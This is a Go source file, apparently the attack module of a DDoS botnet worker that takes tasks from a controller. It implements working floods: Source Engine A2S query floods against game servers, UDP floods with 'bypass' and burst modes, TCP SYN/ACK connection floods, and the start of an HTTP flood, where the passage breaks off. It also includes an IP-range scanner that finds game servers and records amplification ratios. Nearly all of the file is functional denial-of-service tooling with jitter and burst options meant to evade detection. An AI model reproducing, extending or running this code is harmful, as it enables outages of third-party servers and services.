package attack

import (
	"bytes"
	"context"
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

type ServerInfo struct {
	Protocol    byte
	Name        string
	Map         string
	Folder      string
	Game        string
	ID          int16
	Players     byte
	MaxPlayers  byte
	Bots        byte
	ServerType  byte
	Environment byte
	Visibility  byte
	VAC         byte
	Version     string
}

type ScanResult struct {
	IP           string  `json:"ip"`
	Port         int     `json:"port"`
	ResponseSize int     `json:"response_size"`
	ServerName   string  `json:"server_name"`
	Game         string  `json:"game"`
	Map          string  `json:"map"`
	Players      int     `json:"players"`
	MaxPlayers   int     `json:"max_players"`
	VAC          bool    `json:"vac"`
	HasChallenge bool    `json:"has_challenge"`
	BestDomain   string  `json:"best_domain,omitempty"`
	AmpRatio     float64 `json:"amp_ratio,omitempty"`
	TC           bool    `json:"tc,omitempty"`
}

type AttackStats struct {
	PacketsSent uint64
	BytesSent   uint64
	Errors      uint64
	PeakPPS     uint64
	PeakBPS     uint64
	CurrentPPS  uint64
	CurrentBPS  uint64
	lastPackets uint64
	lastBytes   uint64
	StartTime   time.Time
}

type AttackSnapshot struct {
	PacketsSent uint64  `json:"packets_sent"`
	BytesSent   uint64  `json:"bytes_sent"`
	Errors      uint64  `json:"errors"`
	PPS         uint64  `json:"pps"`
	BPS         uint64  `json:"bps"`
	PeakPPS     uint64  `json:"peak_pps"`
	PeakMbps    float64 `json:"peak_mbps"`
	Elapsed     float64 `json:"elapsed"`
	Finished    bool    `json:"finished"`
}

type AttackSession struct {
	Stats    *AttackStats
	StopChan chan struct{}
	DoneChan chan struct{}
	Target   string
	Targets  []string
	Method   string
	stopped  int32
	limiter  *rateLimiter
}

type AttackConfig struct {
	Target       string
	Targets      []string
	Method       string
	Duration     int
	Threads      int
	PacketSize   int
	Mix          bool
	Game         string
	DelayMs      int
	RateLimitPPS int64
	RateLimitBPS int64
	BurstMode    bool
	JitterMs     int
	CanSpoofIP   bool
	CustomPrefix []byte
}

// rateLimiter 是一个双维度（包速率 + 字节速率）令牌桶。
// 令牌计数使用 float64 以累积亚令牌级的小数部分：在高频调用下，
// 单次调用的 elapsed 极小，若用整数会把 elapsed*limit 截断成 0 并丢失
// 该段时间，导致令牌桶严重欠发放、实际速率远低于配置值。
// limit <= 0 表示该维度不限流。
type rateLimiter struct {
	mu         sync.Mutex
	ppsLimit   float64
	bpsLimit   float64
	ppsTokens  float64
	bpsTokens  float64
	lastRefill time.Time
}

func newRateLimiter(maxPPS, maxBPS int64) *rateLimiter {
	l := &rateLimiter{
		lastRefill: time.Now(),
	}
	if maxPPS > 0 {
		l.ppsLimit = float64(maxPPS)
		l.ppsTokens = float64(maxPPS)
	}
	if maxBPS > 0 {
		l.bpsLimit = float64(maxBPS)
		l.bpsTokens = float64(maxBPS)
	}
	return l
}

func (l *rateLimiter) allow(bytes int) bool {
	if l == nil {
		return true
	}
	l.mu.Lock()
	defer l.mu.Unlock()

	now := time.Now()
	elapsed := now.Sub(l.lastRefill).Seconds()
	if elapsed < 0 {
		elapsed = 0
	}
	l.lastRefill = now

	if l.ppsLimit > 0 {
		l.ppsTokens = min(l.ppsLimit, l.ppsTokens+elapsed*l.ppsLimit)
	}
	if l.bpsLimit > 0 {
		l.bpsTokens = min(l.bpsLimit, l.bpsTokens+elapsed*l.bpsLimit)
	}

	// 先判定两个维度都放行，再一起扣减，避免只扣一个维度造成漂移。
	if l.ppsLimit > 0 && l.ppsTokens < 1 {
		return false
	}
	if l.bpsLimit > 0 && l.bpsTokens < float64(bytes) {
		return false
	}

	if l.ppsLimit > 0 {
		l.ppsTokens--
	}
	if l.bpsLimit > 0 {
		l.bpsTokens -= float64(bytes)
	}
	return true
}

const rateLimiterShards = 16

type shardedRateLimiter struct {
	shards [rateLimiterShards]rateLimiter
	cursor atomic.Uint64
}

func newShardedRateLimiter(maxPPS, maxBPS int64) *shardedRateLimiter {
	sl := &shardedRateLimiter{}
	// 用浮点除法避免 maxPPS < rateLimiterShards 时整数除法截断为 0，
	// 否则该维度会被 allow() 当作"不限流"静默放大
	ppsPerShard := float64(maxPPS) / rateLimiterShards
	bpsPerShard := float64(maxBPS) / rateLimiterShards
	for i := range sl.shards {
		sl.shards[i].lastRefill = time.Now()
		if maxPPS > 0 {
			sl.shards[i].ppsLimit = ppsPerShard
			sl.shards[i].ppsTokens = ppsPerShard
		}
		if maxBPS > 0 {
			sl.shards[i].bpsLimit = bpsPerShard
			sl.shards[i].bpsTokens = bpsPerShard
		}
	}
	return sl
}

func (sl *shardedRateLimiter) allow(bytes int) bool {
	if sl == nil {
		return true
	}
	idx := sl.cursor.Add(1) % rateLimiterShards
	return sl.shards[idx].allow(bytes)
}

var globalShardedLimiter atomic.Value

func SetGlobalRateLimiter(maxPPS, maxBPS int64) {
	if maxPPS <= 0 && maxBPS <= 0 {
		globalShardedLimiter.Store((*shardedRateLimiter)(nil))
		return
	}
	globalShardedLimiter.Store(newShardedRateLimiter(maxPPS, maxBPS))
}

func globalRateAllow(bytes int) bool {
	l := globalShardedLimiter.Load()
	if l == nil {
		return true
	}
	limiter, ok := l.(*shardedRateLimiter)
	if !ok || limiter == nil {
		return true
	}
	return limiter.allow(bytes)
}

var bufPool = sync.Pool{
	New: func() interface{} {
		b := make([]byte, 65507)
		return &b
	},
}

type timeCache struct {
	t        time.Time
	interval time.Duration
}

func newTimeCache() timeCache {
	return timeCache{t: time.Now(), interval: 500 * time.Microsecond}
}

func (tc *timeCache) refresh() {
	tc.t = time.Now()
}

func (tc *timeCache) since(end time.Time) time.Duration {
	if time.Since(tc.t) > tc.interval {
		tc.t = time.Now()
	}
	return tc.t.Sub(end)
}

func getBuf() []byte {
	return *bufPool.Get().(*[]byte)
}

func putBuf(b []byte) {
	b = b[:cap(b)]
	bufPool.Put(&b)
}

type udpConnPool struct {
	conns chan *net.UDPConn
	addr  *net.UDPAddr
	mu    sync.Mutex
}

func newUDPConnPool(addr *net.UDPAddr, size int) *udpConnPool {
	p := &udpConnPool{
		conns: make(chan *net.UDPConn, size),
		addr:  addr,
	}
	for i := 0; i < size; i++ {
		conn, err := net.DialUDP("udp", nil, addr)
		if err != nil {
			continue
		}
		p.conns <- conn
	}
	return p
}

func (p *udpConnPool) acquire() *net.UDPConn {
	select {
	case conn := <-p.conns:
		return conn
	default:
		// 池空（如 fd 耗尽导致 DialUDP 全部失败）：临时新建连接，
		// 避免永久阻塞使 Stop() 挂死
		conn, err := net.DialUDP("udp", nil, p.addr)
		if err != nil {
			return nil
		}
		return conn
	}
}

func (p *udpConnPool) release(conn *net.UDPConn) {
	select {
	case p.conns <- conn:
	default:
		// 池已满（连接由 acquire 在池空时临时新建，超出池容量）：
		// 直接关闭，避免 release 阻塞导致发送线程卡死
		conn.Close()
	}
}

func (p *udpConnPool) closeAll() {
	close(p.conns)
	for conn := range p.conns {
		conn.Close()
	}
}

var (
	a2sInfoReq   = []byte{0xFF, 0xFF, 0xFF, 0xFF, 0x54, 0x53, 0x6F, 0x75, 0x72, 0x63, 0x65, 0x20, 0x45, 0x6E, 0x67, 0x69, 0x6E, 0x65, 0x20, 0x51, 0x75, 0x65, 0x72, 0x79, 0x00}
	a2sPlayerReq = []byte{0xFF, 0xFF, 0xFF, 0xFF, 0x55}
	a2sRulesReq  = []byte{0xFF, 0xFF, 0xFF, 0xFF, 0x56}
)

func NewAttackSession(target string, targets []string, method string, limiter *rateLimiter) *AttackSession {
	s := &AttackSession{
		Stats:    &AttackStats{StartTime: time.Now()},
		StopChan: make(chan struct{}),
		DoneChan: make(chan struct{}),
		Target:   target,
		Targets:  targets,
		Method:   method,
		limiter:  limiter,
	}
	go s.trackRates()
	return s
}

func (s *AttackSession) finish() {
	if atomic.CompareAndSwapInt32(&s.stopped, 0, 1) {
		close(s.StopChan)
	}
}

// abort 用于目标无效的早期返回：同时关闭 StopChan（让 trackRates 退出）
// 与 DoneChan（通知等待方）。若只关 DoneChan 不关 StopChan，
// trackRates 的每秒 ticker 会永久泄漏。
func (s *AttackSession) abort() {
	s.finish()
	close(s.DoneChan)
}

// waitGroupTimeout 等待 WaitGroup 完成，但最多等待 timeout：
// 个别攻击 goroutine 卡死（如目标不消费数据的 TCP Write）时，
// 不能让 wg.Wait() 永久阻塞——否则 DoneChan 永不关闭，
// 任务到时不结束、Controller 超时后重复派发攻击。
func waitGroupTimeout(wg *sync.WaitGroup, timeout time.Duration) {
	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()
	select {
	case <-done:
	case <-time.After(timeout):
	}
}

func (s *AttackSession) Stop() {
	s.finish()
	// 等待攻击 goroutine 退出，但最多 5 秒：
	// 防止个别 goroutine 卡死（如网络异常）时调用方（worker 心跳主循环）被永久阻塞
	select {
	case <-s.DoneChan:
	case <-time.After(5 * time.Second):
	}
}

func (s *AttackSession) nextTarget(idx uint64) string {
	if len(s.Targets) == 0 {
		return s.Target
	}
	return s.Targets[idx%uint64(len(s.Targets))]
}

func (s *AttackSession) trackRates() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			packets := atomic.LoadUint64(&s.Stats.PacketsSent)
			bytes := atomic.LoadUint64(&s.Stats.BytesSent)
			pps := packets - s.Stats.lastPackets
			bps := bytes - s.Stats.lastBytes
			s.Stats.lastPackets = packets
			s.Stats.lastBytes = bytes
			atomic.StoreUint64(&s.Stats.CurrentPPS, pps)
			atomic.StoreUint64(&s.Stats.CurrentBPS, bps)
			if pps > atomic.LoadUint64(&s.Stats.PeakPPS) {
				atomic.StoreUint64(&s.Stats.PeakPPS, pps)
			}
			if bps > atomic.LoadUint64(&s.Stats.PeakBPS) {
				atomic.StoreUint64(&s.Stats.PeakBPS, bps)
			}
		case <-s.StopChan:
			return
		}
	}
}

func (s *AttackSession) Snapshot() AttackSnapshot {
	return AttackSnapshot{
		PacketsSent: atomic.LoadUint64(&s.Stats.PacketsSent),
		BytesSent:   atomic.LoadUint64(&s.Stats.BytesSent),
		Errors:      atomic.LoadUint64(&s.Stats.Errors),
		PPS:         atomic.LoadUint64(&s.Stats.CurrentPPS),
		BPS:         atomic.LoadUint64(&s.Stats.CurrentBPS),
		PeakPPS:     atomic.LoadUint64(&s.Stats.PeakPPS),
		PeakMbps:    float64(atomic.LoadUint64(&s.Stats.PeakBPS)) * 8.0 / 1000000.0,
		Elapsed:     time.Since(s.Stats.StartTime).Seconds(),
	}
}

func QueryServer(addr *net.UDPAddr, timeout time.Duration) (*ServerInfo, error) {
	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return nil, err
	}
	defer conn.Close()

	conn.SetReadDeadline(time.Now().Add(timeout))
	_, err = conn.Write(a2sInfoReq)
	if err != nil {
		return nil, err
	}

	buf := make([]byte, 4096)
	n, _, err := conn.ReadFromUDP(buf)
	if err != nil {
		return nil, err
	}

	data := buf[:n]
	if len(data) < 5 {
		return nil, fmt.Errorf("response too short (%d bytes)", len(data))
	}

	header := data[4]
	switch header {
	case 0x41:
		if len(data) < 9 {
			return nil, fmt.Errorf("challenge data incomplete")
		}
		challenge := binary.LittleEndian.Uint32(data[5:9])
		challengeQuery := make([]byte, len(a2sInfoReq)+4)
		copy(challengeQuery, a2sInfoReq)
		binary.LittleEndian.PutUint32(challengeQuery[len(a2sInfoReq):], challenge)

		conn.SetReadDeadline(time.Now().Add(timeout))
		_, err = conn.Write(challengeQuery)
		if err != nil {
			return nil, err
		}

		n, _, err = conn.ReadFromUDP(buf)
		if err != nil {
			return nil, err
		}
		data = buf[:n]
		if len(data) < 5 || data[4] != 0x49 {
			return nil, fmt.Errorf("did not receive valid server info")
		}
	case 0x49:
	default:
		return nil, fmt.Errorf("unknown response header: 0x%02X", header)
	}

	return parseServerInfo(data[5:])
}

func parseServerInfo(payload []byte) (*ServerInfo, error) {
	if len(payload) < 6 {
		return nil, fmt.Errorf("payload too short")
	}

	info := &ServerInfo{}
	pos := 0
	info.Protocol = payload[pos]
	pos++

	var err error
	info.Name, pos, err = readString(payload, pos)
	if err != nil {
		return nil, err
	}
	info.Map, pos, err = readString(payload, pos)
	if err != nil {
		return nil, err
	}
	info.Folder, pos, err = readString(payload, pos)
	if err != nil {
		return nil, err
	}
	info.Game, pos, err = readString(payload, pos)
	if err != nil {
		return nil, err
	}

	if pos+16 > len(payload) {
		return nil, fmt.Errorf("insufficient data")
	}

	info.ID = int16(binary.LittleEndian.Uint16(payload[pos : pos+2]))
	pos += 2
	info.Players = payload[pos]
	pos++
	info.MaxPlayers = payload[pos]
	pos++
	info.Bots = payload[pos]
	pos++
	info.ServerType = payload[pos]
	pos++
	info.Environment = payload[pos]
	pos++
	info.Visibility = payload[pos]
	pos++
	info.VAC = payload[pos]
	pos++

	info.Version, pos, err = readString(payload, pos)
	if err != nil && err.Error() != "string unterminated" {
		return nil, err
	}

	return info, nil
}

func readString(payload []byte, start int) (string, int, error) {
	end := bytes.IndexByte(payload[start:], 0)
	if end == -1 {
		return string(payload[start:]), len(payload), fmt.Errorf("string unterminated")
	}
	return string(payload[start : start+end]), start + end + 1, nil
}

func PreAttackScan(ip string, port int) (*ServerInfo, error) {
	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		return nil, err
	}
	return QueryServer(addr, 3*time.Second)
}

func ScanIP(ip string, port int, timeout time.Duration) *ScanResult {
	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		return nil
	}

	conn, err := net.ListenUDP("udp", nil)
	if err != nil {
		return nil
	}
	defer conn.Close()

	conn.SetWriteDeadline(time.Now().Add(timeout))
	_, err = conn.WriteToUDP(a2sInfoReq, addr)
	if err != nil {
		return nil
	}

	conn.SetReadDeadline(time.Now().Add(timeout))
	buf := make([]byte, 4096)
	n, _, err := conn.ReadFromUDP(buf)
	if err != nil {
		return nil
	}

	if n < 5 {
		return nil
	}

	if bytes.HasPrefix(buf[:4], []byte{0xFF, 0xFF, 0xFF, 0xFF}) {
		header := buf[4]
		hasChallenge := false
		switch header {
		case 0x41:
			if n < 9 {
				return nil
			}
			hasChallenge = true
			challenge := binary.LittleEndian.Uint32(buf[5:9])
			challengeQuery := make([]byte, len(a2sInfoReq)+4)
			copy(challengeQuery, a2sInfoReq)
			binary.LittleEndian.PutUint32(challengeQuery[len(a2sInfoReq):], challenge)
			conn.SetReadDeadline(time.Now().Add(timeout))
			_, err = conn.WriteToUDP(challengeQuery, addr)
			if err != nil {
				return nil
			}
			conn.SetReadDeadline(time.Now().Add(timeout))
			n, _, err = conn.ReadFromUDP(buf)
			if err != nil {
				return nil
			}
			if n < 5 || buf[4] != 0x49 {
				return nil
			}
		case 0x49:
		default:
			return nil
		}
		info, _ := parseServerInfo(buf[5:])
		sr := &ScanResult{IP: ip, Port: port, ResponseSize: n, HasChallenge: hasChallenge}
		if info != nil {
			sr.ServerName = info.Name
			sr.Game = info.Game
			sr.Map = info.Map
			sr.Players = int(info.Players)
			sr.MaxPlayers = int(info.MaxPlayers)
			sr.VAC = info.VAC == 1
		}
		return sr
	}

	return nil
}

// RangeSize 返回 IPv4 地址区间的大小（含首尾），start/end 可逆序。
func RangeSize(startIP, endIP string) uint64 {
	start := ipToUint32(startIP)
	end := ipToUint32(endIP)
	if start > end {
		start, end = end, start
	}
	return uint64(end) - uint64(start) + 1
}

func ScanRange(ctx context.Context, startIP, endIP string, port int, timeoutSec int, concurrency int) []ScanResult {
	start := ipToUint32(startIP)
	end := ipToUint32(endIP)
	if start > end {
		start, end = end, start
	}

	// 限制扫描范围：超过 65536 个地址拒绝，防止 /8 段触发上亿 goroutine 或死循环
	total := uint64(end) - uint64(start) + 1
	if total > 65536 {
		return nil
	}

	// 并发上限保护
	if concurrency <= 0 || concurrency > 512 {
		concurrency = 50
	}

	var results []ScanResult
	var mu sync.Mutex

	sem := make(chan struct{}, concurrency)
	var wg sync.WaitGroup
	timeout := time.Duration(timeoutSec) * time.Second

	// end=0xFFFFFFFF 时 ipInt++ 会回绕，用 total 计数保证循环次数精确
	var ipInt uint32 = start
	for i := uint64(0); i < total; i++ {
		if ctx != nil {
			if err := ctx.Err(); err != nil {
				break
			}
		}
		ip := uint32ToIP(ipInt)
		wg.Add(1)
		sem <- struct{}{}
		go func(ipStr string) {
			defer wg.Done()
			defer func() { <-sem }()

			result := ScanIP(ipStr, port, timeout)

			if result != nil {
				mu.Lock()
				results = append(results, *result)
				mu.Unlock()
			}
		}(ip)
		ipInt++
	}

	wg.Wait()
	return results
}

func ipToUint32(ipStr string) uint32 {
	ip := net.ParseIP(ipStr)
	if ip == nil {
		return 0
	}
	ip = ip.To4()
	if ip == nil {
		return 0
	}
	return binary.BigEndian.Uint32(ip)
}

func uint32ToIP(n uint32) string {
	ip := make(net.IP, 4)
	binary.BigEndian.PutUint32(ip, n)
	return ip.String()
}

func StartVSEAttack(target string, duration int, threads int, packetSize int, mix bool, delayMs int) *AttackSession {
	return StartVSEAttackEx(AttackConfig{
		Target: target, Duration: duration, Threads: threads,
		PacketSize: packetSize, Mix: mix, DelayMs: delayMs,
	})
}

func StartVSEAttackEx(cfg AttackConfig) *AttackSession {
	s := NewAttackSession(cfg.Target, cfg.Targets, "vse", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))

	if cfg.Target == "" && len(cfg.Targets) == 0 {
		s.abort()
		return s
	}

	if cfg.PacketSize < 25 {
		cfg.PacketSize = 25
	}
	if cfg.Duration < 1 {
		cfg.Duration = 60
	}
	if cfg.Threads < 1 {
		cfg.Threads = 10
	}

	addrs := resolveTargets(cfg)
	if len(addrs) == 0 {
		s.abort()
		return s
	}

	baseQueries := [][]byte{a2sInfoReq}
	if cfg.Mix {
		baseQueries = [][]byte{a2sInfoReq, a2sPlayerReq, a2sRulesReq}
	}

	type threadData struct {
		packets [][]byte
		rng     *FastRNG
	}
	workerData := make([]threadData, cfg.Threads)
	for i := 0; i < cfg.Threads; i++ {
		rng := NewFastRNG(time.Now().UnixNano() + int64(i))
		td := threadData{packets: make([][]byte, len(baseQueries)), rng: rng}
		for j, base := range baseQueries {
			pkt := make([]byte, cfg.PacketSize)
			copy(pkt, base)
			if cfg.PacketSize > len(base) {
				rng.Read(pkt[len(base):])
			}
			td.packets[j] = pkt
		}
		workerData[i] = td
	}

	numTargets := len(addrs)
	poolSize := cfg.Threads
	if poolSize > numTargets*2 {
		poolSize = numTargets * 2
	}
	if poolSize < 1 {
		poolSize = 1
	}
	if poolSize > 256 {
		poolSize = 256
	}

	var pools []*udpConnPool
	for _, addr := range addrs {
		pools = append(pools, newUDPConnPool(addr, poolSize))
	}

	go func() {
		defer func() {
			for _, p := range pools {
				p.closeAll()
			}
		}()
		var wg sync.WaitGroup
		dur := time.Duration(cfg.Duration) * time.Second

		// 统一走连接池：此前单目标非 burst 路径每个线程 DialUDP 一个 socket，
		// threads=10000 时瞬间占用上万 fd 触发 fd 耗尽，攻击退化为错误循环。
		for i := 0; i < cfg.Threads; i++ {
			wg.Add(1)
			go func(td threadData, seed int) {
				defer wg.Done()

				var currentPool *udpConnPool
				var conn *net.UDPConn
				endTime := time.Now().Add(dur)
				targetIdx := uint64(seed)
				tc := newTimeCache()

				for tc.since(endTime) < 0 {
					select {
					case <-s.StopChan:
						if conn != nil {
							currentPool.release(conn)
						}
						return
					default:
					}

					tidx := int(targetIdx % uint64(len(pools)))
					targetIdx++
					currentPool = pools[tidx]
					conn = currentPool.acquire()
					if conn == nil {
						// 连接池耗尽且新建失败（fd 耗尽）：短暂等待后重试
						atomic.AddUint64(&s.Stats.Errors, 1)
						time.Sleep(time.Millisecond * 10)
						continue
					}

					if cfg.BurstMode {
						s.sendBurst(conn, td, endTime, cfg.JitterMs)
					} else {
						s.sendPackets(conn, td, 1, 0)
					}

					currentPool.release(conn)
					conn = nil

					if cfg.JitterMs > 0 {
						jitter := time.Duration(td.rng.Intn(cfg.JitterMs)) * time.Millisecond
						time.Sleep(jitter)
					}
					tc.refresh()
				}
			}(workerData[i], i)
		}

		select {
		case <-time.After(dur):
		case <-s.StopChan:
		}
		s.finish()
		waitGroupTimeout(&wg, 5*time.Second)
		s.Snapshot()
		close(s.DoneChan)
	}()

	return s
}

func (s *AttackSession) sendBurst(conn *net.UDPConn, td struct {
	packets [][]byte
	rng     *FastRNG
}, endTime time.Time, jitterMs int,
) {
	burstSize := td.rng.Intn(20) + 5
	for i := 0; i < burstSize && time.Since(endTime) < 0; i++ {
		select {
		case <-s.StopChan:
			return
		default:
		}

		pkt := td.packets[td.rng.Intn(len(td.packets))]
		if !s.checkRate(len(pkt)) {
			time.Sleep(time.Microsecond * 50)
			continue
		}
		n, err := conn.Write(pkt)
		if err != nil {
			atomic.AddUint64(&s.Stats.Errors, 1)
		} else {
			atomic.AddUint64(&s.Stats.PacketsSent, 1)
			atomic.AddUint64(&s.Stats.BytesSent, uint64(n))
		}
	}

	silenceMs := 50 + td.rng.Intn(150)
	if jitterMs > 0 {
		silenceMs = jitterMs + td.rng.Intn(jitterMs)
	}
	timer := time.NewTimer(time.Duration(silenceMs) * time.Millisecond)
	defer timer.Stop()
	select {
	case <-s.StopChan:
		return
	case <-timer.C:
	}
}

func (s *AttackSession) sendPackets(conn *net.UDPConn, td struct {
	packets [][]byte
	rng     *FastRNG
}, count int, delayMs int,
) {
	for i := 0; i < count; i++ {
		select {
		case <-s.StopChan:
			return
		default:
		}
		pkt := td.packets[td.rng.Intn(len(td.packets))]
		if !s.checkRate(len(pkt)) {
			time.Sleep(time.Microsecond * 50)
			continue
		}
		n, err := conn.Write(pkt)
		if err != nil {
			atomic.AddUint64(&s.Stats.Errors, 1)
		} else {
			atomic.AddUint64(&s.Stats.PacketsSent, 1)
			atomic.AddUint64(&s.Stats.BytesSent, uint64(n))
		}
	}
}

func (s *AttackSession) checkRate(bytes int) bool {
	if !globalRateAllow(bytes) {
		return false
	}
	if s.limiter == nil {
		return true
	}
	return s.limiter.allow(bytes)
}

func resolveTargets(cfg AttackConfig) []*net.UDPAddr {
	var targets []string
	if len(cfg.Targets) > 0 {
		targets = cfg.Targets
	} else {
		targets = strings.Split(cfg.Target, "\n")
		if len(targets) == 1 {
			targets = []string{cfg.Target}
		}
	}

	var addrs []*net.UDPAddr
	for _, t := range targets {
		t = strings.TrimSpace(t)
		if t == "" {
			continue
		}
		ip, port := SplitTarget(t)
		if port == 0 {
			port = 27015
		}
		addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", ip, port))
		if err != nil {
			continue
		}
		addrs = append(addrs, addr)
	}
	return addrs
}

func StartUDPFlood(ip string, port int, duration int, packetSize int, threads int, mode string) *AttackSession {
	return StartUDPFloodEx(AttackConfig{
		Target: fmt.Sprintf("%s:%d", ip, port), Duration: duration,
		Threads: threads, PacketSize: packetSize, Method: "udp_" + mode,
	})
}

func StartUDPFloodEx(cfg AttackConfig) *AttackSession {
	ip, port := SplitTarget(cfg.Target)
	if port == 0 {
		port = 80
	}
	mode := strings.TrimPrefix(cfg.Method, "udp_")
	s := NewAttackSession(cfg.Target, cfg.Targets, "udp_"+mode, newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))

	if ip == "" && len(cfg.Targets) == 0 {
		s.abort()
		return s
	}

	if cfg.PacketSize < 1 {
		cfg.PacketSize = 1400
	}
	if cfg.Duration < 1 {
		cfg.Duration = 60
	}
	if cfg.Threads < 1 {
		cfg.Threads = 10
	}

	addrs := resolveTargets(cfg)
	if len(addrs) == 0 {
		s.abort()
		return s
	}

	type threadData struct {
		pool [][]byte
		rng  *FastRNG
		mode string
	}
	workerData := make([]threadData, cfg.Threads)
	for i := 0; i < cfg.Threads; i++ {
		rng := NewFastRNG(time.Now().UnixNano() + int64(i))
		td := threadData{rng: rng, mode: mode}
		switch mode {
		case "bypass":
			td.pool = make([][]byte, 10)
			for j := range td.pool {
				td.pool[j] = make([]byte, cfg.PacketSize)
				rng.Read(td.pool[j])
			}
		case "stdhex":
			base := []byte{0xDE, 0xAD, 0xBE, 0xEF}
			td.pool = [][]byte{make([]byte, cfg.PacketSize)}
			copy(td.pool[0], base)
			rng.Read(td.pool[0][4:])
		case "plain":
			p := make([]byte, cfg.PacketSize)
			for j := range p {
				p[j] = 'A'
			}
			td.pool = [][]byte{p}
		case "burst":
			td.pool = [][]byte{make([]byte, cfg.PacketSize)}
			rng.Read(td.pool[0])
		}
		workerData[i] = td
	}

	go func() {
		var wg sync.WaitGroup
		dur := time.Duration(cfg.Duration) * time.Second

		for i := 0; i < cfg.Threads; i++ {
			wg.Add(1)
			go func(td threadData, seed int) {
				defer wg.Done()
				addr := addrs[seed%len(addrs)]
				conn, err := net.DialUDP("udp", nil, addr)
				if err != nil {
					atomic.AddUint64(&s.Stats.Errors, 1)
					return
				}
				defer conn.Close()

				endTime := time.Now().Add(dur)
				tc := newTimeCache()

				batchBuf := make([][]byte, maxBatchSize)
				pktSz := cfg.PacketSize

				for tc.since(endTime) < 0 {
					select {
					case <-s.StopChan:
						return
					default:
					}

					n := 0
					for n < maxBatchSize && tc.since(endTime) < 0 {
						select {
						case <-s.StopChan:
							return
						default:
						}
						if !s.checkRate(pktSz) {
							break
						}
						batchBuf[n] = td.pool[td.rng.Intn(len(td.pool))]
						n++
					}

					if n > 0 {
						sent, totalBytes := sendBatchUDP(conn, batchBuf[:n])
						atomic.AddUint64(&s.Stats.PacketsSent, uint64(sent))
						atomic.AddUint64(&s.Stats.BytesSent, uint64(totalBytes))
						atomic.AddUint64(&s.Stats.Errors, uint64(n-sent))
					} else {
						time.Sleep(time.Microsecond * 50)
					}

					if mode == "burst" {
						time.Sleep(100 * time.Millisecond)
					}

					if cfg.JitterMs > 0 {
						jitter := time.Duration(td.rng.Intn(cfg.JitterMs)) * time.Millisecond
						time.Sleep(jitter)
					}
					tc.refresh()
				}
			}(workerData[i], i)
		}

		// 可中断等待：任务到期或被 Stop()/熔断关闭 StopChan 时立即返回，
		// 使 Stop() 不必阻塞到 duration 自然结束。
		select {
		case <-time.After(dur):
		case <-s.StopChan:
		}
		s.finish()
		waitGroupTimeout(&wg, 5*time.Second)
		close(s.DoneChan)
	}()

	return s
}

func StartTCPFlood(ip string, port int, duration int, packetSize int, threads int, mode string) *AttackSession {
	return StartTCPFloodEx(AttackConfig{
		Target: fmt.Sprintf("%s:%d", ip, port), Duration: duration,
		Threads: threads, PacketSize: packetSize, Method: "tcp_" + mode,
	})
}

func StartTCPFloodEx(cfg AttackConfig) *AttackSession {
	mode := strings.TrimPrefix(cfg.Method, "tcp_")
	s := NewAttackSession(cfg.Target, cfg.Targets, "tcp_"+mode, newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))

	if cfg.PacketSize < 1 {
		cfg.PacketSize = 1024
	}
	if cfg.Duration < 1 {
		cfg.Duration = 60
	}
	if cfg.Threads < 1 {
		cfg.Threads = 10
	}

	targets := resolveTargetStrings(cfg)
	if len(targets) == 0 {
		s.abort()
		return s
	}

	go func() {
		var wg sync.WaitGroup
		dur := time.Duration(cfg.Duration) * time.Second
		reuseConn := mode == "ack" || mode == "tcpbypass"

		for i := 0; i < cfg.Threads; i++ {
			wg.Add(1)
			go func(seed int) {
				defer wg.Done()
				rng := NewFastRNG(time.Now().UnixNano() + int64(seed))
				endTime := time.Now().Add(dur)
				payload := make([]byte, cfg.PacketSize)
				rng.Read(payload)
				var targetIdx uint64
				tc := newTimeCache()

				for tc.since(endTime) < 0 {
					select {
					case <-s.StopChan:
						return
					default:
					}

					addr := targets[int(atomic.AddUint64(&targetIdx, 1))%len(targets)]

					if !s.checkRate(1) {
						time.Sleep(time.Millisecond * 10)
						continue
					}

					conn, err := net.DialTimeout("tcp", addr, 1*time.Second)
					if err != nil {
						atomic.AddUint64(&s.Stats.Errors, 1)
						continue
					}

					switch {
					case mode == "syn" || mode == "connect":
						conn.Close()
						atomic.AddUint64(&s.Stats.PacketsSent, 1)
						atomic.AddUint64(&s.Stats.BytesSent, 1)
					case reuseConn:
						for sent := 0; sent < 50 && time.Since(endTime) < 0; sent++ {
							select {
							case <-s.StopChan:
								conn.Close()
								return
							default:
							}
							// WriteDeadline 必须设置：目标不消费数据时
							// Write 可能永久阻塞，卡死整个攻击 goroutine，
							// 导致任务到时不结束、Controller 超时重试
							conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
							_, err := conn.Write(payload)
							if err != nil {
								atomic.AddUint64(&s.Stats.Errors, 1)
								break
							}
							atomic.AddUint64(&s.Stats.PacketsSent, 1)
							atomic.AddUint64(&s.Stats.BytesSent, uint64(cfg.PacketSize))
							time.Sleep(2 * time.Millisecond)
						}
						conn.Close()
					}
					tc.refresh()
				}
			}(i)
		}

		// 可中断等待：任务到期或被 Stop()/熔断关闭 StopChan 时立即返回，
		// 使 Stop() 不必阻塞到 duration 自然结束。
		select {
		case <-time.After(dur):
		case <-s.StopChan:
		}
		s.finish()
		// 等待攻击 goroutine 退出，但最多 5 秒：
		// 个别 goroutine 卡死（如系统调用异常）时不能阻塞任务完成上报，
		// 否则 DoneChan 永不关闭 → Controller 判定任务超时并重试攻击
		waitGroupTimeout(&wg, 5*time.Second)
		close(s.DoneChan)
	}()

	return s
}

func StartHTTPFlood(target string, duration int, threads int) *AttackSession {
	return StartHTTPFloodEx(AttackConfig{
		Target: target, Duration: duration, Threads: threads,
	})
}

func StartHTTPFloodEx(cfg AttackConfig) *AttackSession {
	s := NewAttackSession(cfg.Target, cfg.Targets, "http_flood", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
	if cfg.Duration < 1 {
		cfg.Duration = 60
	}
	if cfg.Threads < 1 {
		cfg.Threads = 10
	}

	targets := resolveTargetStrings(cfg)
